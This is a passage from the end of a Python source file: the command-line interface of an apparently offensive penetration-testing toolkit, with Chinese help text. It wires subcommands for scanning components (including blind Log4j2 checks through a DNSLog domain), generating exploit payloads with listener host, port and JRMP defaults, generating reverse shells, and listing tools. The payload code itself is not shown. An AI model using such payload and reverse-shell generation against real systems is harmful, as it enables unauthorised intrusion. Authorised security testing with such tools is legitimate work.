    s.add_argument("-c", "--comp", help="组件，逗号分隔，默认全部。可选: " + ",".join(ALL))
    s.add_argument("-t", "--threads", type=int, default=8)
    s.add_argument("--timeout", type=float, default=8)
    s.add_argument("--dnslog", default="", help="DNSLog 域名，用于 Log4j2 盲打验证")
    s.add_argument("-v", "--verbose", action="store_true", help="显示未命中的明细")
    s.add_argument("-o", "--out", help="结果输出为 JSON 文件")
    s.set_defaults(func=cmd_scan)

    pl = sub.add_parser("payload", help="Payload 生成")
    pl.add_argument("-c", "--comp", required=True, help="可选: " + ",".join(PAYLOADS.keys()))
    pl.add_argument("--lhost", default="192.168.1.100")
    pl.add_argument("--lport", default="9988")
    pl.add_argument("--jrmp", default="10099")
    pl.add_argument("--dnslog", default="abc123.dnslog.cn")
    pl.add_argument("--cmd", default="id")
    pl.add_argument("--target", default="http://192.168.1.10:8080")
    pl.set_defaults(func=cmd_payload)

    sh = sub.add_parser("shell", help="反弹 Shell 生成")
    sh.add_argument("--lhost", required=True)
    sh.add_argument("--lport", default="9988")
    sh.set_defaults(func=cmd_shell)

    tl = sub.add_parser("tools", help="工具库速查")
    tl.add_argument("-c", "--cat", help="分类，逗号分隔。可选: " + ",".join(TOOLDB.keys()))
    tl.set_defaults(func=cmd_tools)

    args = p.parse_args()
    if not getattr(args, "cmd", None):
        p.print_help()
        return 0
    return args.func(args)


if __name__ == "__main__":
    sys.exit(main())
